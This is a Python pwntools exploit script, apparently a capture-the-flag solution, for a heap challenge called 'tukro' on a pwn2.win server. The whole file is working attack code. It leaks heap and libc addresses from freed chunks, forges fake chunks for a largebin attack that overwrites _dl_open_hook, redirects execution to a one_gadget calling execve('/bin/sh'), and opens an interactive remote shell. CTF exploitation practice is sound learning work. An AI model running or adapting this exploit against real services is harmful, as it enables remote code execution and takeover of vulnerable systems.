#!/usr/bin/env python3
from pwn import *
from os import path

context.update(arch='amd64', os='linux')

def sign_up(io, usr, psw):
    io.sendlineafter('Your choice: ', '1')
    io.sendlineafter('Username: ', usr)
    io.sendlineafter('Password: ', psw)

def sign_in(io, usr, psw):
    io.sendlineafter('Your choice: ', '2')
    io.sendlineafter('Username: ', usr)
    io.sendlineafter('Password: ', psw)

def sign_out(io):
    io.sendlineafter('Your choice: ', '5')

def write(io, usr, content):
    io.sendlineafter('Your choice: ', '1')
    io.sendlineafter('Recipient Username: ', usr)
    io.sendlineafter('Testimonial: ', content)

def show(io):
    io.sendlineafter('Your choice: ', '3')
    buf = io.recvuntil('Edit Testimonial (y/N): ', drop=True)
    io.sendline('n')
    return buf

def edit(io, tid, content):
    io.sendlineafter('Your choice: ', '3')
    io.sendlineafter('Edit Testimonial (y/N): ', 'y')
    io.sendlineafter('Testimonial Number: ', str(tid))
    io.sendlineafter('New Testimonial: ', content)

def delete(io, tid):
    io.sendlineafter('Your choice: ', '4')
    io.sendlineafter('Testimonial Number: ', str(tid))

def main():
    io = remote('tukro.pwn2.win','1337')

    elf = ELF(path.join(path.dirname(__file__), "tukro"), checksec=False)
    libc = ELF(path.join(path.dirname(__file__), "libc.so.6"), checksec=False)

    sign_up(io, 'sndr_usr', 'sndr_usr')
    sign_up(io, 'rcpt_usr', 'rcpt_usr')

    # leak libc & heap
    sign_in(io, 'sndr_usr', 'sndr_usr')
    for _ in range(5): write(io, 'rcpt_usr', '')
    sign_out(io)

    sign_in(io, 'rcpt_usr', 'rcpt_usr')
    delete(io, 2)
    delete(io, 3)
    sign_out(io)

    sign_in(io, 'sndr_usr', 'sndr_usr')
    data = show(io).split()
    sign_out(io)

    # get base addrs
    leaked_chunk = u64(data[-4].ljust(8,b'\x00'))
    heap_addr = leaked_chunk - 0x510
    ubin_addr = u64(data[-1].ljust(8, b'\x00'))
    libc.address = ubin_addr - 0x3c4b78
    ONE_GADGET = 0xf1147

    assert len(hex(leaked_chunk)) == 0xe
    assert len(hex(libc.address)) == 0xe

    # clean heap
    sign_in(io, 'rcpt_usr', 'rcpt_usr')
    for _ in range(3): delete(io, 1)
    sign_out(io)

    # fill unsorted bin
    sign_in(io, 'sndr_usr', 'sndr_usr')
    for _ in range(2): write(io, 'rcpt_usr', '')
    sign_out(io)

    sign_in(io, 'rcpt_usr', 'rcpt_usr')
    delete(io,1)
    sign_out(io)

    # move fakechunk to largebinn
    sign_in(io, 'sndr_usr', 'sndr_usr')
    edit(io, 2, flat({8: leaked_chunk + 0x10}))
    write(io, 'rcpt_usr', '')
    edit(io, 1, flat({8: 0x601, 
                      0x18: leaked_chunk + 0x40, 
                      0x38: 0x511, 
                      0x48: leaked_chunk+0x70}))
    write(io, 'rcpt_usr', '')

    # corrupt _dl_open_hook
    edit(io, 1, flat({8: 0x601, 
                      0x18: libc.sym['_dl_open_hook'] - 0x10, 
                      0x28: libc.sym['_dl_open_hook'] - 0x20, 
                      0x68: 0x611, 
                      0x78: leaked_chunk + 0xa0, 
                      0x98: 0x511, 
                      0xa8: leaked_chunk + 0xd0}))
    write(io, 'rcpt_usr', '')

    # dlopen_mode = execve("/bin/sh", rsp+0x70, environ)
    edit(io, 1, flat({0x60: libc.address+ ONE_GADGET, 0xc8: -1}))
    write(io, 'rcpt_usr', '')

    io.interactive()

if __name__ == '__main__':
    main()
